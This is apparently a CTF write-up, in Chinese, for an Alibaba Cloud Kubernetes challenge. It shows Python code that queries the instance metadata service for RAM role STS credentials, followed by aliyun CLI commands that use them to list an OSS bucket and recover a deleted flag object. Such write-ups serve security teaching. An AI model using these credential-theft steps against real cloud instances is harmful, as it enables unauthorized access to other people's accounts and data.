### SUCTF - easyk8s on aliyun

#### ecs ram role in metadata

python 解释器本身就能访问网络，直接尝试 aliyun metadata

```
import requests
print(requests.get("http://100.100.100.200/latest/meta-data/ram/security-credentials/").text)

print(requests.get("http://100.100.100.200/latest/meta-data/ram/security-credentials/oss-root").text)

> aksk sts 信息

 {
  "AccessKeyId" : "STS.NTU4h9N",
  "AccessKeySecret" : "GtFKSC8ZkETy",
  "Expiration" : "2025-01-12T09:03:33Z",
  "SecurityToken" : "CAIS1Msmy3zEgAA==",
  "LastUpdated" : "2025-01-12T03:03:33Z",
  "Code" : "Success"
}
```

#### oss

使用 oss sts 信息，直接访问 oss

```
aliyun configure --mode=StsToken

# 配置 上面得到的 aksk

aliyun oss ls
# get oss://suctf-flag-bucket

aliyun oss ls oss://suctf-flag-bucket --all-versions

# 开了 bucket 版本控制 flag 被删除了  还原 可以得到 flag
aliyun oss cat oss://suctf-flag-bucket/oss-flag --version-id CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MDc1MjZhOA--
```